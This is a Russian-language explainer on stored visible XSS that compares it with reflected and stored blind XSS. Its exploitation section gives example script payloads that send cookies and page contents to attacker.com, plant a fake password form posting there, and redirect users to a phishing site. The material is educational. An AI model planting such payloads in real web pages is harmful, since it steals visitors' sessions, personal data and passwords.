Хранимая видимая XSS (Stored Visible XSS) — это тип уязвимости, при которой вредоносный код сохраняется на сервере (например, в базе данных, комментариях, сообщениях форума или профилях пользователей) и выполняется в браузере каждого пользователя, который загружает заражённую страницу. В отличие от отражённой XSS, хранимая XSS не требует взаимодействия с жертвой через социальную инженерию, так как вредоносный код уже находится на сервере и автоматически выполняется для всех пользователей.


## Варианты эксплуатации хранимой видимой XSS

1. **Кража файлов cookie**  
    Вредоносный скрипт может быть внедрён в страницу для кражи cookie всех пользователей, которые её посещают.  
    Пример кода:
```
<script>fetch('http://attacker.com/steal?cookie='+document.cookie);</script>
```

2. **Кража личных данных**  
    Злоумышленник может внедрить скрипт, который извлекает личные данные пользователей (например, имена, адреса, номера телефонов) и отправляет их на контролируемый сервер.  
    Пример кода:
```
<script>fetch('http://attacker.com/steal', {method: 'POST', body: document.body.innerHTML});</script>
```

3. **Подмена интерфейса**  
    Вредоносный скрипт может изменить содержимое страницы, добавив поддельные формы или элементы, чтобы обмануть пользователей и заставить их ввести конфиденциальные данные.  
    Пример кода:
```
<script>document.body.innerHTML = '<form action="http://attacker.com/steal"><input type="text" name="password"><input type="submit"></form>';</script>
```

4. **Перенаправление на вредоносные сайты**  
    Злоумышленник может внедрить скрипт, который перенаправляет пользователей на фишинговые или вредоносные сайты.  
    Пример кода:
```
<script>window.location='http://phishing-site.com';</script>
```

5. **Распространение вредоносного ПО**  
    Вредоносный скрипт может загружать и запускать вредоносное ПО на устройствах пользователей, используя уязвимости в браузере или плагинах.


## Отличия от отражённой XSS

1. **Механизм выполнения**
    
    - Хранимая XSS: вредоносный код сохраняется на сервере и выполняется для всех пользователей, которые загружают заражённую страницу.
    
    - Отражённая XSS: вредоносный код передаётся через URL или параметры запроса и выполняется только при открытии специально подготовленной ссылки.

2. **Охват атаки**
    
    - Хранимая XSS: автоматически затрагивает всех пользователей, которые посещают заражённую страницу.
    
    - Отражённая XSS: требует взаимодействия с жертвой (например, перехода по ссылке), что делает её более точечной.

3. **Сложность эксплуатации**
    
    - Хранимая XSS: не требует дополнительных действий со стороны пользователя, так как код уже находится на сервере.
    
    - Отражённая XSS: требует использования социальной инженерии для убеждения жертвы выполнить вредоносный запрос.

4. **Длительность воздействия**
    
    - Хранимая XSS: может оставаться активной долгое время, пока вредоносный код не будет удалён с сервера.
    
    - Отражённая XSS: действует только в момент выполнения запроса.

## Отличия от хранимой слепой XSS

1. **Видимость выполнения**
    
    - Хранимая видимая XSS: вредоносный код выполняется непосредственно в браузере пользователя, и результат его работы может быть виден на странице.
    
    - Хранимая слепая XSS: вредоносный код выполняется в контексте, который не отображается напрямую пользователю (например, в админ-панели или логах).

2. **Цель атаки**
    
    - Хранимая видимая XSS: обычно направлена на обычных пользователей, которые посещают заражённую страницу.

    - Хранимая слепая XSS: часто направлена на администраторов или внутренние системы, где вредоносный код может быть выполнен в контексте привилегированного пользователя.

3. **Сложность обнаружения**
    
    - Хранимая видимая XSS: может быть легко обнаружена, так как результат выполнения кода виден на странице.

    - Хранимая слепая XSS: сложнее обнаружить, так как результат выполнения кода не отображается напрямую пользователю.

